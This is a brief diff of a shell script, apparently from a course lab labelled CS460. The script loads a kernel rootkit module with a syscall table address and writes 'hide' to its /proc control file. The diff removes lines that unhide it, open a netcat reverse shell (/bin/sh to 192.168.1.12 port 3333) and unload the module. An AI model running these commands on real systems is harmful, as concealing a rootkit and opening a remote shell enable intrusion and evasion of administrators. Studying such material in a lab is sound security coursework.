@@ -8,10 +8,4 @@ insmod rootkit.ko sys_call_table_addr_input=${SYS_CALL_ADDR}
 
 echo "hide" > /proc/CS460/status
 
-echo "unhide" > /proc/CS460/status
-
-/bin/nc.traditional -c /bin/sh 192.168.1.12 3333
-
-rmmod rootkit
-
 dmesg
